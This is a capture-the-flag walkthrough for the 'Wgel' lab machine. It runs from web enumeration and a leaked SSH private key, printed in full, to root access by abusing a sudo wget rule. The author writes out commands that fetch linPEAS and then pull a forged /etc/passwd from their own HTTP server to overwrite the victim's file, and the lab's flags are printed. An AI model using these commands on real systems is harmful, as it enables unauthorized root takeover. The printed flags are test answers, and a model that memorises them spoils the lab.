# Wgel CTF

export IP=10.10.28.16

http://10.10.28.16
# view source code
<!-- Jessie don't forget to udate the webiste -->

```
username=jessie
```

```
nmap -sC -sV -oN nmN nmap/initial $IP
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

```

```
nikto -h http://$IP
```

```
cp directory-list-2.3-medium.txt /tmp
gobuster dir -u http://$IP -w /tmp/directory-list-2.3-medium.txt 

/sitemap              (Status: 301) [Size: 312] [--> http://10.10.28.16/sitemap/]
# scan /sitemap with common.txt
gobuster dir -u http://$IP/sitemap -w /usr/share/dirb/wordlists/common.txt 
/.ssh                 (Status: 301) [Size: 317] [--> http://10.10.28.16/sitemap/.ssh/]
```


```
# Open web browser (private key) 
http://10.10.28.16/sitemap/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
vi jessie_id_rsa
chmod 600 jessie_id_rsa
ssh -i jessie_id_rsa jessie@$IP

```

```
# Logged in as jessie
find | grep flag
./Documents/user_flag.txt
cat ./Documents/user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6

```

```
# Linux PrivEsc Awesome Script
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
# From github
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh
sudo mv linpeas.sh /opt
scp -i jessie_id_rsa /opt/linpeas.sh jessie@$IP:/dev/shm
# On vic
chmod +x /dev/shm/linpeas.sh
/dev/shm/linpeas

# root privs with wget command
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

```
#Create fake /etc/passwd with our own root password

cat /etc/passwd > ~/passwd

python
import crypt
crypt.crypt("p@ssw0rd")

'$6$eIWoGb5ha7V8tYPr$XqkLDMZBibTiqlwCqaA3R8CgERL6S4u7MLsaeQ1b/23TyVc1U7HBATxWwa.VxIwp8OHMEwOR7.0mJFYz2UJIy/'

scp -i jessie_id_rsa jessie@$IP:~/passwd . 
#update ~/passwod with our new password
root:$6$eIWoGb5ha7V8tYPr$XqkLDMZBibTiqlwCqaA3R8CgERL6S4u7MLsaeQ1b/23TyVc1U7HBATxWwa.VxIwp8OHMEwOR7.0mJFYz2UJIy/:...

#start a python webserver 
python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

#connect to vpn
sudo openvpn Kr1pt0e.ovpn

#get vpn IP 10.x.x.x
ip addr show tun0

#overwrite /etc/passwd with ours on vic >:-)
sudo wget http://10.18.24.32:8000/passwd -O /etc/passwd

```
--2022-07-25 05:33:19--  http://10.6.7.164:8000/passwd
Connecting to 10.6.7.164:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2398 (2,3K) [application/octet-stream]
Saving to: ‘/etc/passwd’

/etc/passwd          100%[======================>]   2,34K  --.-KB/s    in 0s      

2022-07-25 05:33:19 (227 MB/s) - ‘/etc/passwd’ saved [2398/2398]
```

#I am Groot!
```
jessie@CorpOne:~$ su -
Password: 
root@CorpOne:~# 
```

```
root@CorpOne:~# cat root_flag.txt 
b1b968b37519ad1daa6408188649263d
```


